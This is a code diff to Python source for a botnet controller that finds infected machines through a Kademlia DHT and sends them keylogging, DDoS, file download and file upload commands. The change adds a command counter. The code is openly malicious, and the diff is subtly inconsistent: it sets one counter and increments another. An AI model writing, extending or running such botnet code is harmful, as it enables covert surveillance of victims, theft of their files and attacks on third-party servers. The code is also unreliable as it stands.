@@ -18,7 +18,7 @@ class SlaveDriver(basic.LineReceiver):
     	self.kserver = kserver #kserver is our kademlia DHT
         self.key = key #key is the hash of the secret string where new nodes announce themselves to a botmaster
         self.slaves = {} #we keep a dictionary of all our slaves' node ids, and the hash of that value
-        
+        self.count = 0 #this will be transmitted with a command to help bot differentiate between new commands
         #The commander needs to constantly check for new bots. When a commander finds a new bot, it sends an ack
         #back to a location thats unique to each node so that they know they've been found. They then look at that location
         #awaiting future commands
@@ -51,23 +51,27 @@ class SlaveDriver(basic.LineReceiver):
             for key,val in self.slaves.iteritems():
                 output = 'Starting keylogger for bot {0}\n'.format(key)
                 self.transport.write(output)
-                self.kserver.set(val,cmd)
+                botcmd = str(self.count) + " " + cmd
+                self.kserver.set(val,botcmd)
         if cmd == 'DDOS':
         	for key,val in self.slaves.iteritems():
         		output = 'Starting DDOS for bot {0}\n'.format(key)
                 self.transport.write(output)
                 #actually send commands out on DHT to bot. Val is the bot's individual location it checks for commands
-                self.kserver.set(val,line)
+               	botcmd = str(self.count) + " " + line
+                self.kserver.set(val,botcmd)
         if cmd == 'DOWNLOAD':
         	for key,val in self.slaves.iteritems():
         		output = 'Starting DOWNLOAD for bot {0}\n'.format(key)
                 self.transport.write(output)
-                self.kserver.set(val,line)
+                botcmd = str(self.count) + " " + line
+                self.kserver.set(val,botcmd)
         if cmd == 'UPLOAD':
         	for key,val in self.slaves.iteritems():
         		output = 'Starting UPLOAD for bot {0}\n'.format(key)
                 self.transport.write(output)
-                self.kserver.set(val,line)
+                botcmd = str(self.count) + " " + line
+                self.kserver.set(val,botcmd)
 
 
 
@@ -90,6 +94,7 @@ class SlaveDriver(basic.LineReceiver):
     		self.transport.write('Invalid Command\n')
     		self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip] [port] [filepath], UPLOAD [ip] [port] [filepath], KEYLOG\n')
     	else:
+    		self.commands += 1
             self.parsecommands(line) #pass line for instructions that have more than one argument
 
 if len(sys.argv) != 4:
